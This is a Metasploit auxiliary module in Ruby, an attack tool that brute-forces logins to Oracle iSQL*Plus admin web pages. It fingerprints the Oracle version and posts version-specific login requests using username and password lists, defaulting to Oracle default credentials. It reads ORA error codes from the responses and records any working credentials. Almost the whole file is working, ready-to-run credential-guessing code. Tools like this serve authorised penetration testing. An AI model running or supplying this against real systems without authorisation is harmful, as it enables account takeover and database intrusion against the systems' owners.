##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute


  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Oracle iSQL*Plus Login Utility',
            'Description' => %q{
              This module attempts to authenticate against an Oracle ISQL*Plus
              administration web site using username and password combinations indicated
              by the USER_FILE, PASS_FILE, and USERPASS_FILE.

              This module does not require a valid SID, but if one is defined, it will be used.
              Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to
              fingerprint the version and automatically select the correct POST request.
            },
            'References'  =>
                [
                    [ 'URL', 'http://carnal0wnage.attackresearch.com' ],
                ],
            'Author'      => [ 'CG', 'todb' ],
            'License'     => MSF_LICENSE
        )
    )

    deregister_options('BLANK_PASSWORDS') # Blank passwords are never valid

    register_options(
        [
            Opt::RPORT(5560),
            OptString.new('URI', [ true, 'Oracle iSQLPlus path.', '/isqlplus/']),
            OptString.new('SID', [ false, 'Oracle SID' ]),
            OptInt.new('TIMEOUT', [false, 'Time to wait for HTTP responses', 60]),
            OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
                                            File.join(Msf::Config.install_root, "data", "wordlists", "oracle_default_userpass.txt") ]),
            OptBool.new('USER_AS_PASS', [ false, "Try the username as the password for all users", false]),
        ],
        self.class
    )
  end

  def verbose; datastore['VERBOSE']; end
  def uri; datastore['URI'].to_s; end

  def timeout
    (datastore['TIMEOUT'] || 60).to_i
  end

  def prefix
    datastore['SSL'] ? "https" : "http"
  end

  def msg
    "#{prefix}://#{rhost}:#{rport}/#{datastore['URI'].gsub(/^\/+/,"")} -"
  end

  def get_oracle_version(ip)
    begin
      res = send_request_cgi({
        'version' => '1.1',
        'uri'     => uri,
        'method'  => 'GET',
      }, timeout)
      oracle_ver = nil
      if (res.nil?)
        print_error("#{msg} no response")
      elsif (res.code == 200)
        print_status("#{msg} Received an HTTP #{res.code}")
        oracle_ver = detect_oracle_version(res)
      elsif (res.code == 404)
        print_error("#{msg} Received an HTTP 404, check URIPATH")
      elsif (res.code == 302)
        print_error("#{msg} Received an HTTP 302 to #{res.headers['Location']}")
      else
        print_error("#{msg} Received an HTTP #{res.code}")
      end
      return oracle_ver
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
      print_error "#{msg} Cannot connect"
    end
  end

  def detect_oracle_version(res)
    m = res.body.match(/iSQL\*Plus Release (9\.0|9\.1|9\.2|10\.1|10\.2)/)
    oracle_ver = nil
    oracle_ver = 10 if m[1] && m[1] =~ /10/
      oracle_ver = m[1].to_f if m[1] && m[1] =~ /9\.[012]/
      if oracle_ver
        print_status("#{msg} Detected Oracle version #{oracle_ver}")
        print_status("#{msg} SID detection for iSQL*Plus 10.1 may be unreliable") if oracle_ver == 10.1
      else
        print_error("#{msg} Unknown Oracle version detected.")
      end
    return oracle_ver
  end

  def check_oracle_version(ver)
    [9.0,9.1,9.2,10].include? ver
  end

  def run_host(ip)
    datastore['BLANK_PASSWORDS'] = false # Always
    ver = get_oracle_version(ip)
    if not check_oracle_version(ver)
      print_error "#{msg} Unknown Oracle version, skipping."
      return
    end
    if datastore['SID'].nil? || datastore['SID'].empty?
      print_status "Using blank SID for authentication."
    end
    each_user_pass do |user, pass|
      # Blank passwords aren't allowed
      if pass.nil? || pass.empty?
        print_status "Skipping blank password for #{user}"
      else
        do_login(user, pass, ver)
      end
    end
  end

  def sid
    if datastore['SID'].nil? || datastore['SID'].empty?
      nil
    else
      datastore['SID']
    end
  end

  def do_login(user='DBSNMP', pass='DBSNMP', version=9.0)
    uri = datastore['URI']

    vprint_status("#{msg} Trying username:'#{user}' with password:'#{pass}' with SID '#{sid}'")
    success = false
    if version == 9.0
      postrequest = "action=logon&sqlcmd=&sqlparms=&username=#{user}&password=#{pass}&sid=#{sid}&privilege=&Log+In=%B5%C7%C2%BC"
    elsif (version == 9.1 || version == 9.2)
      postrequest = "action=logon&username=#{user}&password=#{pass}&sid=#{sid}&login=Login"
    elsif (version == 10)
      postrequest = "username=#{user}&password=#{pass}&connectID=#{sid}&report=&script=&dynamic=&type=&action=&variables=&event=login"
    end

    begin
      res = send_request_cgi({
        'version' => '1.1',
        'uri'     => uri,
        'method'  => 'POST',
        'data'   => postrequest,
        'headers' => { 'Referer' => "http://#{rhost}:#{rport}#{uri}" }
        }, timeout)
      unless (res.kind_of? Rex::Proto::Http::Response)
        vprint_error("#{msg} Not responding")
        return :abort
      end
      return :abort if (res.code == 404)

      if res.code == 200
        # English, German, and Danish.
        if (res.body =~ /Connected as/ or res.body =~ /Angemeldet als/ or res.body =~ /Arbejdssk/)
          success = true
        elsif (res.body =~ /ORA-01017:/ or res.body =~ /ORA-28273:/)
          #print_error("received ORA-01017 -- incorrect credentials")
          success = false
        elsif (res.body =~ /ORA-28009:/ )
          print_good("#{user}:#{pass} is correct but required SYSDBA or SYSOPER login")
          success = true
        elsif (res.body =~ /ORA-28000:/ )#locked account
          success = false
        elsif (res.body =~ /ORA-12170:/ or res.body =~ /ORA-12154:/ or res.body =~ /ORA-12162:/ or res.body =~ /ORA-12560:/)
          print_status("Incorrect SID -- please set a correct (or blank) SID")
          return :abort
        elsif
          print_status("Unknown response, assuming failed. (Supported languages are English, German, and Danish)")
          success = false
        end
      elsif res.code == 302
        print_status("received a 302 to #{res.headers['Location']}")
        return :abort
      else
        print_status("Unexpected Response of: #{res.code}")#''
        return :abort
      end

    rescue ::Rex::ConnectionError => e
      vprint_error("#{msg} - #{e}")
      return :abort
    end

    if success
      print_good("#{msg} successful login '#{user}' : '#{pass}' for SID '#{sid}'")
      report_isqlplus_service(target_host,res)
      report_oracle_sid(target_host,sid)
      report_isqlauth_info(target_host,user,pass,sid)
      return :next_user
    else
      vprint_status "#{msg} username and password failed"
      return :failed
    end
  end

  def report_isqlplus_service(ip,res)
    sname = datastore['SSL'] ? 'https' : 'http'
    report_service(
      :host => ip,
      :proto => 'tcp',
      :port => rport,
      :name => sname,
      :info => res.headers["Server"].to_s.strip
    )
  end

  def report_oracle_sid(ip,sid)
    report_note(
      :host => ip,
      :proto => 'tcp',
      :port => rport,
      :type => "oracle.sid",
      :data => ((sid.nil? || sid.empty?) ? "*BLANK*" : sid),
      :update => :unique_data
    )
  end

  def report_isqlauth_info(ip,user,pass,sid)
    ora_info = {
      :host => ip, :port => rport, :proto => "tcp",
      :pass => pass, :source_type => "user_supplied",
      :active => true
    }
    if sid.nil? || sid.empty?
      ora_info.merge! :user => user
    else
      ora_info.merge! :user => "#{sid}/#{user}"
    end
    report_auth_info(ora_info)
  end

end
